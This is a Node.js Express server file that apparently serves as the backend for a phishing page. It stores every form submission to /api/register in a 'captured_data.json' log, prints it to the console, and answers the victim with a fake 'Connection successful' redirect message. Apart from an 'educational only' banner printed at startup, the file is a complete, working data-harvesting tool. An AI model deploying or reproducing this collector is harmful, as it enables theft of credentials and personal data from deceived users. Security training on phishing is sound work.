const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

// Log directory
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

const logFile = path.join(logDir, 'captured_data.json');

app.post('/api/register', (req, res) => {
    const userData = req.body;
    const timestamp = new Date().toISOString();
    const entry = { timestamp, ...userData };

    console.log('--- NEW DATA CAPTURED ---');
    console.table(userData);

    // Append to file
    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try {
            logs = JSON.parse(fileContent);
        } catch (e) {
            logs = [];
        }
    }
    logs.push(entry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    res.status(200).json({
        message: 'Connection successful. Please wait while we redirect you.',
        status: 'success'
    });
});

app.listen(PORT, () => {
    console.log(`Educational Backend Server is running on http://localhost:${PORT}`);
    console.log('WARNING: This server is for educational demonstrations only.');
});
